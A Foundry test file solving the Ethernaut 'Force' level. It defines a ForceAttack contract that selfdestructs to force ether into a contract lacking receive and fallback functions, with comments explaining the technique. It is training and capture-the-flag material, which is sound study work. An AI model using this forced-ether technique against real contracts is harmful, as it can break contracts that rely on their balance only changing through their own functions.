// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Force} from "src/levels/Force.sol";
import {ForceFactory} from "src/levels/ForceFactory.sol";
// import {ForceAttack} from "src/attacks/ForceAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract ForceAttack {
    function sendEth(address _instance) external payable {
        // _instance.call{value: address(this).balance}("");

        selfdestruct(payable(_instance));
    }

    receive() external payable {}
}

contract TestForceSolution is Test, Utils {
    Ethernaut ethernaut;
    Force instance;

    ForceAttack forceAttack;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        ForceFactory factory = new ForceFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Force(
            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
        );
        forceAttack = new ForceAttack();
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);
        // goal: make Force.sol balance (instance.balance) to be > 0

        // there's no receive or fallback functions on the contract to receive ethereum
        // but reading solidity docs i found out that we can send ethereum balance to a contract (without fallback() receive()) in two different ways
        // 1. if the end of a call is a selfdestruct() -> where we can just create a contract that sends ethereum to the contract and ends with selfdestruct
        // 2. setting the conrtact as a receiver for a coinbase miner trasnaction

        // i will use the option 1. so i can implement a contract that does this
        // first send balance to our attack contract

        // send initial eth to the forceAttack contract
        address(forceAttack).call{value: 0.01 ether}("");

        // see if forceAttack has eth balance
        console.log(address(forceAttack).balance);

        // call function that uses selfdestruct with instance as param
        forceAttack.sendEth(address(instance));

        // check that instance has some balance
        assert(address(instance).balance > 0);
    }
}
